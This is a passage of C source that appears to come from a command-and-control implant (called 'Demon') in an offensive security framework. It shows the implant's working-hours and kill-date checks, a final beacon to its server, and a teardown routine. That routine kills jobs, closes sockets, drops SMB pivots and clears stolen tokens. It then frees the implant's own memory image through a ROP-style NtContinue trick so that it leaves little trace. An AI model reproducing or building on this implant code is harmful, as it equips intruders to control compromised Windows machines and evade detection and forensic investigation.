    if ( ( ( WorkingHours >> 22 ) & 1 ) == 0 )
        return TRUE;

    StartHour   = ( WorkingHours >> 17 ) & 0b011111;
    StartMinute = ( WorkingHours >> 11 ) & 0b111111;
    EndHour     = ( WorkingHours >>  6 ) & 0b011111;
    EndMinute   = ( WorkingHours >>  0 ) & 0b111111;

    Instance.Win32.GetLocalTime(&SystemTime);

    if ( SystemTime.wHour < StartHour || SystemTime.wHour > EndHour )
        return FALSE;

    if ( SystemTime.wHour == StartHour && SystemTime.wMinute < StartMinute )
        return FALSE;

    if ( SystemTime.wHour == EndHour && SystemTime.wMinute > EndMinute )
        return FALSE;

    return TRUE;
}

BOOL ReachedKillDate()
{
    return Instance.Config.Transport.KillDate && GetEpochTime() >= Instance.Config.Transport.KillDate;
}

VOID KillDate( )
{
    PUTS( "Reached KillDate"  )

    /* Send our last message to our server...
     * "They say time is the fire in which we burn.
     * Right now, Captain, my time is running out." */
    PPACKAGE Package = PackageCreate( DEMON_KILL_DATE );
    PackageTransmit( Package, NULL, NULL );

    CommandExit( NULL );
}

// TODO: rewrite this. disconnect all pivots. kill our threads. release memory and free itself.
VOID CommandExit( PPARSER Parser )
{
    PUTS( "Exit" );

    /* default is 1 == exit thread.
     * TODO: make an config that holds the default exit method */
    UINT32           ExitMethod    = 1;
    PPACKAGE         Package       = NULL;
    CONTEXT          RopExit       = { 0 };
    LPVOID           ImageBase     = NULL;
    SIZE_T           ImageSize     = 0;
    PJOB_DATA        JobList       = Instance.Jobs;
    DWORD            JobID         = 0;
    PSOCKET_DATA     SocketList    = Instance.Sockets;
    PSOCKET_DATA     SocketEntry   = NULL;
    PDOWNLOAD_DATA   DownloadList  = Instance.Downloads;
    PDOWNLOAD_DATA   DownloadEntry = NULL;
    PMEM_FILE        MemFileList   = Instance.MemFiles;
    PMEM_FILE        MemFileEntry  = NULL;
    PPIVOT_DATA      SmbPivotList  = Instance.SmbPivots;
    PPIVOT_DATA      SmbPivotEntry = NULL;

    if ( Parser )
    {
        /* Send our last message to our server...
         * "My battery is low, and it’s getting dark." */
        Package    = PackageCreate( DEMON_EXIT );
        ExitMethod = ParserGetInt32( Parser );

        PackageAddInt32( Package, ExitMethod );
        PackageTransmit( Package, NULL, NULL );
    }

    // kill all running jobs
    for ( ;; )
    {
        if ( ! JobList )
            break;

        JobID = JobList->JobID;
        JobList = JobList->Next;

        JobKill( JobID );
    }

    // close all sockets
    for ( ;; )
    {
        if ( ! SocketList )
            break;

        SocketEntry = SocketList;
        SocketList = SocketList->Next;

        if ( SocketEntry->Socket )
        {
            Instance.Win32.closesocket( SocketEntry->Socket );
            SocketEntry->Socket = 0;
        }

        MemSet( SocketEntry, 0, sizeof( SOCKET_DATA ) );
        NtHeapFree( SocketEntry );
    }

    // remove downloads
    for ( ;; )
    {
        if ( ! DownloadList )
            break;

        DownloadEntry = DownloadList;
        DownloadList = DownloadList->Next;

        DownloadRemove( DownloadEntry->FileID );
    }

    // remove memfiles
    for ( ;; )
    {
        if ( ! MemFileList )
            break;

        MemFileEntry = MemFileList;
        MemFileList = MemFileList->Next;

        RemoveMemFile( MemFileEntry->ID );
    }

    // free the DownloadChunk buffer
    if ( Instance.DownloadChunk.Buffer )
    {
        NtHeapFree( Instance.DownloadChunk.Buffer );
        Instance.DownloadChunk.Buffer = NULL;
        Instance.DownloadChunk.Length = 0;
    }

    // disconnect from all smb pivots
    for ( ;; )
    {
        if ( ! SmbPivotList )
            break;

        SmbPivotEntry = SmbPivotList;
        SmbPivotList = SmbPivotList->Next;

        PivotRemove( SmbPivotEntry->DemonID );
    }

    // stop impersonating
    TokenImpersonate( FALSE );

    // clear all stolen tokens
    TokenClear();

    // terminate the use of the Winsock 2 DLL (Ws2_32.dll)
    if ( Instance.WSAWasInitialised )
        Instance.Win32.WSACleanup();

    /* NOTE:
     *      Credit goes to Austin (@ilove2pwn_) for sharing this code with me.
     * TODO:
     *      Clear memory by using a gadgets that prepares and executes movsb
     */

    ImageBase = C_PTR( Instance.Session.ModuleBase );
    ImageSize = IMAGE_SIZE( ImageBase );

    RopExit.ContextFlags = CONTEXT_FULL;
    Instance.Win32.RtlCaptureContext( &RopExit );

    RopExit.Rip = U_PTR( Instance.Syscall.NtFreeVirtualMemory );
    RopExit.Rsp = U_PTR( ( RopExit.Rsp &~ ( 0x1000 - 1 ) ) - 0x1000 );
    RopExit.Rcx = U_PTR( NtCurrentProcess() );
    RopExit.Rdx = U_PTR( &ImageBase );
    RopExit.R8  = U_PTR( &ImageSize );
    RopExit.R9  = U_PTR( MEM_RELEASE );

    if ( ExitMethod == 1 )
        *( ULONG_PTR volatile * ) ( RopExit.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.RtlExitUserThread );

    else if ( ExitMethod == 2 )
        *( ULONG_PTR volatile * ) ( RopExit.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.RtlExitUserProcess );

    RopExit.ContextFlags = CONTEXT_FULL;
    Instance.Syscall.NtContinue( &RopExit, FALSE );
}
